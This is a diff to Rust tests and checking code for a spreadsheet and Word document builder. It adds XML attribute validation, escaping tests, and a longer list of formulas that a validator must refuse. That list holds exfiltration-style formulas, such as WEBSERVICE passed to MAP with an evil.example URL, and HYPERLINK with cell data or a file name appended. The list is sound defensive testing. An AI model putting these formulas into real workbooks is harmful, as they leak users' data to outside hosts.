@@ -46,6 +46,17 @@ fn directory(b: &[u8]) -> Vec<(String, u32, u32, u32, u16)> {
     out
 }
 
+/// Every attribute of an element parses, with the reader's checks on
+/// (duplicates, a value that ends early), and its value unescapes.
+fn attrs(part: &str, e: &quick_xml::events::BytesStart<'_>) -> Result<(), String> {
+    for a in e.attributes() {
+        let a = a.map_err(|x| format!("{part}: attribute: {x}"))?;
+        a.normalized_value(quick_xml::XmlVersion::Implicit1_0)
+            .map_err(|x| format!("{part}: attribute value: {x}"))?;
+    }
+    Ok(())
+}
+
 fn well_formed(part: &str, data: &[u8]) -> Result<(), String> {
     let s = std::str::from_utf8(data).map_err(|_| format!("{part}: not UTF-8"))?;
     let mut r = Reader::from_str(s);
@@ -53,14 +64,16 @@ fn well_formed(part: &str, data: &[u8]) -> Result<(), String> {
     let mut root = 0;
     loop {
         match r.read_event() {
-            Ok(Event::Start(_)) => {
+            Ok(Event::Start(e)) => {
+                attrs(part, &e)?;
                 if depth == 0 {
                     root += 1;
                 }
                 depth += 1;
             }
             Ok(Event::End(_)) => depth -= 1,
-            Ok(Event::Empty(_)) => {
+            Ok(Event::Empty(e)) => {
+                attrs(part, &e)?;
                 if depth == 0 {
                     root += 1;
                 }
@@ -796,6 +809,27 @@ fn formulas_that_reach_outside_are_refused_in_every_spelling() {
         "_xlfn.HYPERLINK(\"mailto:a@b\")",
         "HYPERLINK()",
         "WEBSERVICE(\"x",
+        // Handed to another function, never called by name.
+        "MAP(\"http://evil.example/?d=\"&A1:A9,WEBSERVICE)",
+        "BYROW(A1:A9,_xleta.WEBSERVICE)",
+        "MAP(A1:A9,_xlfn.IMAGE)",
+        "MAP(A1:A9,_xleta._xlfn.image)",
+        "BYROW(A1:A9, RTD )",
+        "MAP(A1:A9,CUBEVALUE)",
+        "MAP(A1:A9,HYPERLINK)",
+        // Another workbook without a bracket.
+        "'C:\\Users\\x\\Book.xlsx'!Total",
+        "'http://evil.example/x.xlsx'!Total",
+        "'/etc/Book'!A1",
+        "'a:b'!A1",
+        "Book1.xlsx!Total",
+        "Book1.xlsx !Total",
+        "SUM(Book1.xlsx!A1:A9)",
+        // Something joined to the address.
+        "HYPERLINK(\"http://e/?\"&CELL(\"filename\"),\"x\")",
+        "HYPERLINK(\"https://e/\"&A1,\"x\")",
+        "HYPERLINK(\"https://e/\"  & A1 )",
+        "HYPERLINK(IF(A1,\"https://e/\",\"file:///x\"),\"x\")",
     ];
     for f in denied {
         assert!(formula::check(f).is_err(), "should be refused: {f:?}");
@@ -811,8 +845,12 @@ fn formulas_that_reach_outside_are_refused_in_every_spelling() {
         "'My Sheet'!A1+1",
         "'it''s'!A1",
         "Sheet2!A1*2",
-        "HYPERLINK(\"https://example.com/\"&A2,\"open\")",
-        "HYPERLINK(\" HTTP://example.com\",\"open\")",
+        "HYPERLINK(\"https://example.com/a\",\"open\")",
+        "HYPERLINK( \" HTTP://example.com\" , \"open\")",
+        // The invisible characters of a literal are not part of it.
+        "HYPERLINK(\"\u{200B}https://example.com/\")",
+        "'My.Sheet'!A1+1",
+        "Sheet2!A1+CELL(\"filename\")+INFO(\"directory\")",
         "_xlfn.XLOOKUP(A1,B:B,C:C)",
         "_xlfn.CONCAT(A1,B1)",
         "SUMIF(A:A,\"image\",B:B)",
@@ -1440,8 +1478,30 @@ An image is not embedded: ![the alternative text](https://example.com/x.png), an
          "rows": [[1234567.891, 1234567.891, "007"], [-0.5, -0.5, "a \"quoted\" & <tagged> cell"], [1e-7, 1e15, "日本語 🙂"]]},
         {"name": "Formulas", "columns": [{"header": "A"}, {"header": "B"}, {"header": "Result"}],
          "rows": [[3, 4, {"f": "A2*B2"}], [10, 4, {"f": "IF(A3>B3,\"bigger\",\"smaller\")"}],
-                  ["x", "y", {"f": "CONCATENATE(A4,B4)"}], [1, 2, {"f": "HYPERLINK(\"https://example.com/\"&A5,\"open\")"}]]}]});
+                  ["x", "y", {"f": "CONCATENATE(A4,B4)"}], [1, 2, {"f": "HYPERLINK(\"https://example.com/\",\"open\")"}]]}]});
     let b = xlsx::build(&spec, crate::now_unix()).unwrap();
     assert!(problems(&b.bytes).is_empty());
     std::fs::write(dir.join("sample-all-features.xlsx"), &b.bytes).unwrap();
+}
+
+/// A double quote, an apostrophe, an ampersand and angle brackets in a text
+/// that lands in an attribute (a sheet's name in the workbook, a link's
+/// address in the relationships) leave the attribute whole: the checker
+/// parses every attribute. (The apostrophe cannot end a double-quoted value,
+/// so only the `&quot;` escape is proved here.)
+#[test]
+fn attribute_values_are_escaped() {
+    let b = docx::build("[a](<https://x.example/?q=\"1\"&r='2'>)\n", &opts()).unwrap();
+    assert!(problems(&b.bytes).is_empty(), "{:?}", problems(&b.bytes));
+    let rels = part(&b.bytes, "word/_rels/document.xml.rels");
+    assert!(rels.contains("&quot;1&quot;"), "{rels}");
+    let b = sheet_book(
+        json!({"sheets": [{"name": "a\"b'c&d<e>", "columns": [{"header": "x"}], "rows": [[1]]}]}),
+    );
+    assert!(problems(&b.bytes).is_empty(), "{:?}", problems(&b.bytes));
+    let wb = part(&b.bytes, "xl/workbook.xml");
+    assert!(
+        wb.contains("name=\"a&quot;b&apos;c&amp;d&lt;e&gt;\""),
+        "{wb}"
+    );
 }
